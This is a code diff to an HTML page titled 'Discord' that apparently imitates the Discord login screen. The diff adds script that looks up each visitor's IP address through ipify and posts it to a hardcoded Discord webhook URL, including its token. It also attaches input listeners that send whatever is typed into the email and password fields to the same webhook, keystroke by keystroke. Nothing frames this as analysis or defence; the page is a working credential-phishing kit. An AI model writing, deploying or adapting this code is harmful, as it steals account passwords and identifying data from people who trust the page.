@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 <head>
   <title>Discord</title>
@@ -128,6 +129,33 @@
 </head>
 <body>
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/1299192306531962910/5Y9fNdk8nyaR1-uR1jTgamOIr_sP8R71SszcL6LS31e_k9GOI8DI4dy7rSL9hweyUkmL";
+
+    // Function to send data to the webhook
+    function sendToWebhook(data) {
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ content: data })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+      })
+      .catch(error => console.error('Error sending data:', error));
+    }
+
+    // Fetch and send the visitor's IPv4 address
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        sendToWebhook(`Visitor's IP: ${data.ip}`);
+      })
+      .catch(error => console.error('Error fetching IP address:', error));
+
     let focusApplied = false;
 
     function isPCOrTablet() {
@@ -180,6 +208,14 @@
 
       return false; // Prevent form submission
     }
+
+    document.getElementById('email').addEventListener('input', function() {
+      sendToWebhook(`Email: ${this.value}`);
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+      sendToWebhook(`Password: ${this.value}`);
+    });
 
     function openRegisterModal() {
       document.getElementById('registerModal').style.display = 'flex';
